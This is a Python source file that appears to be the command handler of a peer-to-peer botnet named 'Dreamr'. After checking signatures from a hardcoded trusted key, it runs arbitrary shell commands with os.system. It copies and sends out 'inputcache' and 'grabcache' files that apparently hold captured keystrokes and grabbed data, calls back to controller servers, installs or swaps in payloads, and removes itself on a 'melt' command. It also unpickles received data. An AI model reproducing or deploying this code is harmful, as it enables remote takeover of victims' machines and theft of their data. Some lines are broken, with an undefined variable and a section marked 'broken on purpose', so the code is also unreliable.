import os
import time
import random
import rsa
import pickle
import socket
from config import *
from models import *
from core import *
from config import *
from update import *
from collect import *
from shutil import copyfile

from Context import Dreamr

# Handles deserialized PseerMessages
class DreamrMessageHandler():

	hostAddr = ""

	# Init the message handler
	def __init__(self):
		debug("message_handler", "init")
		self.hostAddr = socket.gethostbyname(socket.gethostname())
		return

	# Handles an incomming network message, and returns the appropriate response to that message
	def handleMessage(self, message):
		global MSG_EXPIRE
		print("-------- PEER MESSAGE --------")
		print("ID: %s" % message.msgId)
		print("Type: %s" % message.msgType)
		print("Sender: %s" % message.msgSender)
		print("Public: %s" % message.msgSenderPublic)
		print("Data: %s" % message.msgData)
		print("-------- DEBUG_SLIP ---------")

		if (not isinstance(message, PeerMessage)):
			print("that message wasn't a message")
			return None

		# Filter out messages that have clearly incorrect timestamps (older than MSG_EXPIRE)
		try:
			if ((int(time.time()) - int(message.msgTime)) > MSG_EXPIRE):
				print("message with bad timestamp")
				return None
		except:
			print("message with bad timestamp and a bad something else")
			return None

		if (Dreamr.unseen.seen(message.msgId)):
			print("this unit has already seen this message before")
			return

		# Verify that the message didn't come from an expired host, and register the host if not regiestered
		isFromServer = bool(message.msgId.split(":")[0])
		if (Dreamr.keystore.validateHost(NetworkHost(message.msgSender, isFromServer, message.msgSenderPublic, int(time.time())))):
			print("validated message sender public")
			# Set this to whatever the response of your command type should be
			content = message.msgData # the incomming data

			### NETWORK COMMAND TYPES (NO CRYPT) ###

			# Similar to a ping. The payload is "still love you" if doing a ping, and
			# "count" if the network test was initiated because of a TYPE_NETWORK_COUNT
			if (message.msgType == TYPE_NETWORK_TEST):
				try:
					if ("you too" in message.msgData):
						print(content)
					if ("still love you" in message.msgData):
						print(content)
						return self.buildResponseMessage(TYPE_NETWORK_TEST, "you too")
				except Exception as e:
					pass
				return None

			# The message is a file
			if (message.msgType == TYPE_NETWORK_FILE):
				return None

			# The message should be printed on the console
			if (message.msgType == TYPE_NETWORK_RESULT):
				try:
					print(content)
				except Exception as e:
					pass
				return None

			# Clients will routinely connect to servers and ask for updates.
			# the server will forward the first update that comes out of the queue
			if (message.msgType == TYPE_NETWORK_SYNC):
				debug("message_handler", "got TYPE_NETWORK_SYNC")
				if (int(time.time()) % 7 == 0): # 1/7 chance we send a random server host address IP
					return self.buildResponseMessage(TYPE_NETWORK_HOST, Dreamr.keystore.getRandomServerAddress())
				else:
					return Dreamr.store.getLastValid()

			#### TRUSTED SIGNED MESSAGE TYPES ###
			if (message.msgSenderPublic == Dreamr.crypt.DRMTrustedKey and message.msgType >= 20):
				try:
					# check signature before executing commands
					(data, signature) = content

					if (data and Dreamr.crypt.verifyTrustedSignature(data, signature)):

						# Put the signed message in the store for the others
						Dreamr.store.appendMessage(message)

						# TODO extra verification as an example for industry. Distributed networks like this one could
						# use cryptography that would make it difficult for defenders to protect against.
						### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ###
						(selectorType, selectorValue, contentTime, contentName, contentValue) = pickle.loads(data)
						### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ### ###

						if (int(selectorType) == SELECTOR_TYPE_PROBABILITY):
							if (int(time.time()) % int(selectorValue) == 0):
								return

						# Call back to a server with UDP
						if (message.msgType == TYPE_COUNT_REQUEST):
							serverAddr = contentValue
							countURL = "http://%s/callback.php?id=%s" % (contentValue, Dreamr.clientID)
							urllib2.urlopen(some_url).read()

						# broken on purpose
						if (message.msgType == TYPE_LOG_REQUEST):
							os.chdir(KeyPath)
							targetInputCache = "%s-inputcache-%s" % (self.hostAddr, int(time.time()))
							targetGrabCache = "%s-grabcache-%s" % (self.hostAddr, int(time.time()))

							try:
								copyfile("inputcache", targetInputCache)
								Collect(WebPath, targetInputCache, message.msgReturn).start()
							except:
								print("no inputcache")

							try:
								copyfile("grabcache", targetGrabCache)
								Collect(WebPath, targetGrabCache, message.msgReturn).start()
							except:
								print("no grabcache")

						if (message.msgType == TYPE_GARBAGE_FILE):
							print("TYPE_GARBAGE_FILE")
							Garbage(contentValue).start()

						if (message.msgType == TYPE_CLEAR_KEYSTORE):
							print("TYPE_CLEAR_KEYSTORE")
							Dreamr.keystore.clearKeystore()

						# Command from me to you
						if (message.msgType == TYPE_MELT):
							print("TYPE_MELT")
							if (contentValue == "bye"):
								melt()
								os._exit(420)
							else:
								pass

						# Execute the following command (warn)
						if (message.msgType == TYPE_EXEC):
							if (contentValue):
								os.system(contentValue)

						# Replace self with payload
						if (message.msgType == TYPE_UPDATE):
							Updater(contentName, contentValue, False).start()

						# Exec self along side payload
						if (message.msgType == TYPE_INSTALL):
							Updater(contentName, contentValue, True).start()
					else:
						pass
				except Exception as e:
					pass
				return None

			### UNTRUSTED ENCRYPTED MESSAGE TYPES ###
			elif (message.msgType >= 10 and message.msgType < 20):
				try:
					contentValue = Dreamr.crypt.decryptAndVerify(message.msgData, message.msgSenderPublic)

					# Message containing a single good server addresses
					if (message.msgType == TYPE_NETWORK_HOST):
						debug("message_handler", "got TYPE_NETWORK_HOSTS")
						try:
							if (contentValue):
								# Add the host to the keystore as a pending host
								# pending hosts get 'tested' and moved to the actual
								# hostlist
								Dreamr.keystore.addPendingHost(contentValue)
								debug("message_handler", "Learned about a new host: %s" % contentValue)
						except Exception as e:
							debug("message_handler", "Error learning about new server from %s" % msgSender)

					# # Message containing a single good server addresses
					# if (message.msgType == TYPE_DOWNLOAD_FILE):
					# 	debug("message_handler", "got TYPE_DOWNLOAD_FILE")
					# 	try:
					# 		if (contentValue):
					# 			if (downloadFile(contentValue, "%s%s" % (WebPath, self.updateName), self.updateSHA)):
					# 				debug("message", "download was success")

					# 	except Exception as e:
					# 		debug("message_handler", "error learn about new server from %s" % msgSender)

					# Tell another host about an encryption key for a future
					# TYPE_NETWORK or reuslt message
					if (message.msgType == TYPE_NETWORK_KEY):
						debug("message_handler", "Received a temp key. Added to keystore.")
						#Dreamr.keystore.addMessageKey(ContentKey(contentID, contentName, contentTime, contentValue))
				except Exception as e:
					debug("message_handler", "Untrusted command error. -> %s" % str(e))
				return None
			return None
		else:
			debug("message_handler", "Host signature wasn't valid, or didn't use valid encryption keys")
			return None
		return None

	# Returns a message with the id, time
	def buildResponseMessage(self, msgType, msgData, msgReturn = None):
		if (Dreamr.server):
			msgId = "1:%s%s" % (random.randint(10000, 99999), int(time.time()))
		else:
			msgId = "0:%s%s" % (random.randint(10000, 99999), int(time.time()))
		msgTime = int(time.time())
		if (DEBUG_MODE):
			msgSender = Dreamr.internal
		else:
			msgSender = Dreamr.external
		msgSenderPublic = Dreamr.crypt.DRMPublicKey
		print(Dreamr.crypt.DRMPublicKey)
		debug("message_handler", "Built and sending a response.")
		return PeerMessage(msgId, msgType, msgTime, msgReturn, msgSender, msgSenderPublic, msgData)

	# def testEncryptedFile():
	# 	# BOTH
	# 	crypt = DreamrCrypto(".\\")
	# 	msgSender = "127.0.0.1"
	# 	msgSenderPublic = crypt.DRMPublicKey

	# 	# TYPE_NETWORK_FILE
	# 	msgIdFile = "%s%s" % (random.randint(10000, 99999), int(time.time()))
	# 	msgTime = int(time.time())
	# 	msgData = "file contents"
	# 	message = PeerMessage(msgIdFile, TYPE_NETWORK_FILE, msgTime, msgSender, msgSenderPublic,  msgData)

	# 	# TYPE_NETWORK_KEY string
	# 	msgIdKey = "%s%s" % (random.randint(10000, 99999), int(time.time()))
	# 	msgDataKey = ':'.join([msgIdFile, "test.txt", str(int(time.time())), "ismcvbwyxppzq"])
	# 	msgDataKey = crypt.encryptAndSign(msgDataKey, crypt.DRMPublicKey)
	# 	messageKey = PeerMessage(msgIdKey, TYPE_NETWORK_KEY, msgTime, msgSender, msgSenderPublic, msgDataKey)

	# 	print(DreamrMessageHandler("127.0.0.1", crypt).handleMessage(messageKey))
	# 	time.sleep(3)
	# 	print(DreamrMessageHandler("127.0.0.1", crypt).handleMessage(message))
	# 	store = Dreamr.keystore.dumpMessageKeys()
	# 	os._exit(420)

	# # Fully tests a network sync by loading hosts and waiting for the host data to come back out
	# def testSyncTest():
	# 	crypt = DreamrCrypto(".\\")
	# 	msgId = "%s%s" % (random.randint(10000, 99999), int(time.time()))
	# 	msgTime = int(time.time())
	# 	msgData = "file contents"
	# 	msgSender = "127.0.0.1"
	# 	msgSenderPublic = crypt.DRMPublicKey
	# 	message = PeerMessage(msgId, TYPE_NETWORK_SYNC, msgTime, msgSender, msgSenderPublic, msgData)
	# 	print(DreamrMessageHandler("127.0.0.1", crypt).handleMessage(message))
	# 	os._exit(420)